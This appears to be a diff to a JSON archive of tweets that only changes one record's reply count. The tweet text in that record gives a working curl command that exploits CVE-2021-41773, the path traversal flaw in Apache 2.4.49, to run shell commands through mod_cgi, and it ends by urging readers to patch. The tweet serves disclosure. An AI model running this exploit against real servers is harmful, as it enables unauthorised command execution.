@@ -897,7 +897,7 @@
 {
     "tweetfavorites": 1115,
     "tweetquotes": 45,
-    "tweetreplies": 15,
+    "tweetreplies": 14,
     "tweetretweets": 503,
     "tweettext": "Here's how to run full commands with arguments via CVE-2021-41773 via a path traversal vulnerability in the event mod-cgi is enabled on Apache 2.4.49\n\ncurl --data \"A=|id&gt;&gt;/tmp/x;uname\\$IFS-a&gt;&gt;/tmp/x\" 'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -vv\n\nPatch urgently. https://t.co/jaL6jpR42w",
     "tweettime": "2021-10-05, 23:30:19",
